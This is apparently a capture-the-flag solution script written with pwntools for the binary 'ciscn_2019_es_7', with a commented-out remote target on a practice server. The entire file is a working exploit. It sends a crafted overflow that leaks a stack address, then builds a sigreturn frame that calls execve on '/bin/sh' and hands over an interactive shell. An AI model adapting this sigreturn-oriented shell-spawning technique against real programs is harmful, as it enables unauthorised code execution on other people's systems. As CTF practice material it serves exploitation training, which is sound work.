from pwn import *
p=process("./ciscn_2019_es_7")
#p=remote("node5.buuoj.cn",28620)
context.log_level="debug"
context.arch="amd64"
context.os="Linux"
elf=ELF("ciscn_2019_es_7")

def debug():
    gdb.attach(p)
    pause()

vuln=0x4004ed
p.send(b"/bin/sh\x00"+p64(0)+p64(vuln))
p.recv(0x20)
stack_addr=u64(p.recv(0x8))
print("stack_addr :",hex(stack_addr))
p.recv(0x8)

sigreturn_addr=0x4004da
syscall_ret=0x400517
sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_execve
sigframe.rdi=stack_addr-0x118
sigframe.rsi=0x0
sigframe.rdx=0x0
#sigframe.rsp=stack_addr
sigframe.rip=syscall_ret
p.send(b"/bin/sh\x00"+p64(0)+p64(sigreturn_addr)+p64(syscall_ret)+bytes(sigframe))
p.interactive()
#debug()
